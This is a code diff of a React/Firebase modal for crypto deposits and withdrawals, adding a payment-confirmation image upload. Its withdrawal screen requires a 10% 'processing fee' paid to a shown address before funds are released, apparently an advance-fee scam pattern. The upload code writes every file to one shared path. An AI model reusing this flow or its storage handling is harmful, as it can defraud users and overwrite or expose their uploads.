@@ -4,8 +4,11 @@ import Modal from "react-modal";
 import { motion } from "framer-motion";
 import { useRouter } from "next/router";
 import { onAuthStateChanged } from "firebase/auth";
-import { auth, firestore } from "@/components/Firebase";
+import { auth, firestore, storage, upload } from "@/components/Firebase";
 import { doc, getDoc, updateDoc } from "firebase/firestore";
+import FileInput from "./FileInpit";
+import { useAuth } from "./AuthContext";
+import { getDownloadURL, ref, uploadBytes } from "firebase/storage";
 
 const MoneyTransactionDialog = ({
   isOpen,
@@ -15,19 +18,20 @@ const MoneyTransactionDialog = ({
   address,
   information,
   Withdrawal,
-  // amount, 
+  // amount,
   // setAmount,
 }) => {
   const [currency, setCurrency] = useState("");
   const [amount, setAmount] = useState("");
   const [wallet, setWallet] = useState("");
   const [isCopied, setIsCopied] = useState(false);
+  const { user } = useAuth();
   const router = useRouter();
   const handleConfirmDeposit = () => {
     // Validate input and perform necessary actions
     onConfirm({ currency, amount });
     console.log(amount);
-    upgrading(amount, "deposit")
+    upgrading(amount, "deposit");
     alert(
       "Your deposit is been processed and will finally reflect after the first two (2) confirmations"
     );
@@ -43,15 +47,13 @@ const MoneyTransactionDialog = ({
         const uid = user.uid;
         let userData;
         const userRef = doc(firestore, "users", user.uid);
-        if (type == "deposit"){
+        if (type == "deposit") {
           await updateDoc(userRef, {
             pending: true,
             pendingType: type,
             pendingAmount: amount,
           });
-
-        }else{
-
+        } else {
           await updateDoc(userRef, {
             pending: true,
             pendingType: type,
@@ -69,8 +71,8 @@ const MoneyTransactionDialog = ({
   const handleConfirmWithdrawal = () => {
     // Validate input and perform necessary actions
     onConfirm({ currency, amount });
-    console.log( amount, wallet)
-    upgrading(amount, "withdraw", "",  wallet )
+    console.log(amount, wallet);
+    upgrading(amount, "withdraw", "", wallet);
     alert(
       "Your withdrawal is been processed and will finally reflect on your designated wallet address"
     );
@@ -117,6 +119,46 @@ const MoneyTransactionDialog = ({
   };
 
   console.log(Withdrawal);
+
+  const onFileChange = async (file) => {
+    console.log(user.uid);
+    const userRef = doc(firestore, "users", user.uid);
+
+    const confirmRef = ref(storage, "confirm", user.uid);
+    uploadBytes(confirmRef, file).then(async (snapshot) => {
+      // console.log("snapshot", snapshot);
+      let link = await getDownloadURL(confirmRef);
+
+      console.log(link);
+
+      await updateDoc(userRef, { pendingImage: link }).then(() =>
+        console.log("File stuff has been done")
+      );
+    });
+    // onAuthStateChanged(auth, async (user) => {
+    //   const userRef = doc(firestore, "users", user.uid);
+    //    try {
+    //     await upload(file, user.uid).then( (link) => {
+    //       console.log(link)
+    //     })
+
+    //     //  console.log(fileLink)
+    //     //  await updateDoc(userRef, {pendingImage: `${fileLink}`}).then( () => {
+    //     //    console.log("Fle has to be Uploaded")
+    //     //  })
+    //    } catch (error) {
+    //     console.log(error)
+    //    }
+
+    //   // await upload(file, user.uid).then( async (link) => {
+    //   //   console.log(link)
+    //   //   await updateDoc(userRef, { pendingImage: `${link}` }).then(() =>
+    //   //   console.log("File has been Uploaded")
+    //   // );
+
+    //   // })
+    // })
+  };
 
   return (
     <Modal
@@ -216,67 +258,68 @@ const MoneyTransactionDialog = ({
                 </div>
               );
             } else {
-              return (<div>
-
-              
+              return (
                 <div>
-                  <label
-                    htmlFor="address"
-                    className="block text-gray-700 font-bold my-2"
-                  >
-                    Fee
-                  </label>
-                  <input
-                    type="text"
-                    id="address"
-                    className="w-full p-2 border rounded-md bg-gray-300"
-                    value={(amount * 0.1).toFixed(1)}
-                   
-                    
-                  / >
-                    <p> Pay the 10% processing fee to instantly withdraw from your account</p>
-                </div>
-                <div className="flex justify-between items-center">
-          <p
-            onClick={handleCopyClick}
-            className="flex justify-between items-center relative my-2 py-2 px-4 overflow-auto text-sm rounded-lg bg-green-300 font-semibold border-black"
-          >
-            {address}
-            {/* <button
+                  <div>
+                    <label
+                      htmlFor="address"
+                      className="block text-gray-700 font-bold my-2"
+                    >
+                      Fee
+                    </label>
+                    <input
+                      type="text"
+                      id="address"
+                      className="w-full p-2 border rounded-md bg-gray-300"
+                      value={(amount * 0.1).toFixed(1)}
+                    />
+                    <p>
+                      {" "}
+                      Pay the 10% processing fee to instantly withdraw from your
+                      account
+                    </p>
+                  </div>
+                  <div className="flex justify-between items-center">
+                    <p
+                      onClick={handleCopyClick}
+                      className="flex justify-between items-center relative my-2 py-2 px-4 overflow-auto text-sm rounded-lg bg-green-300 font-semibold border-black"
+                    >
+                      {address}
+                      {/* <button
             onClick={handleCopyClick}
             className=" text-right  ml-4 px-3 py-1 bg-green-600 text-white rounded-md transition-transform transform hover:scale-110 focus:outline-none"
           >
            {isCopied ? 'Copied' : 'Copy'}
           </button> */}
-          </p>
-          <motion.button
-            onClick={handleCopyClick}
-            className={`right-0 ml-2 px-3 py-1 rounded-md focus:outline-none ${
-              isCopied ? "bg-green-600" : "bg-green-500"
-            } text-white`}
-            initial={{ scale: 1 }}
-            animate={{ scale: isCopied ? 1.1 : 1 }}
-            transition={{ duration: 0.3 }}
-          >
-            {isCopied ? "Copied" : "Copy"}
-          </motion.button>
-        </div>
-                <div>
-                  <label
-                    htmlFor="address"
-                    className="block text-gray-700 font-bold my-2"
-                  >
-                   Your Wallet Address
-                  </label>
-                  <input
-                    type="text"
-                    id="address"
-                    className="w-full p-2 border rounded-md"
-                    value={wallet}
-                    onChange={(e) => setWallet(e.target.value)}
-                    required
-                  />
-                </div>
+                    </p>
+                    <motion.button
+                      onClick={handleCopyClick}
+                      className={`right-0 ml-2 px-3 py-1 rounded-md focus:outline-none ${
+                        isCopied ? "bg-green-600" : "bg-green-500"
+                      } text-white`}
+                      initial={{ scale: 1 }}
+                      animate={{ scale: isCopied ? 1.1 : 1 }}
+                      transition={{ duration: 0.3 }}
+                    >
+                      {isCopied ? "Copied" : "Copy"}
+                    </motion.button>
+                  </div>
+                  <div>
+                    <label
+                      htmlFor="address"
+                      className="block text-gray-700 font-bold my-2"
+                    >
+                      Your Wallet Address
+                    </label>
+                    <input
+                      type="text"
+                      id="address"
+                      className="w-full p-2 border rounded-md"
+                      value={wallet}
+                      onChange={(e) => setWallet(e.target.value)}
+                      required
+                    />
+                  </div>
                 </div>
               );
             }
@@ -339,6 +382,7 @@ const MoneyTransactionDialog = ({
           </motion.button>
         </div>
       )}
+      <FileInput onFileChange={onFileChange} />
       <button
         onClick={() =>
           Withdrawal ? handleConfirmWithdrawal() : handleConfirmDeposit()
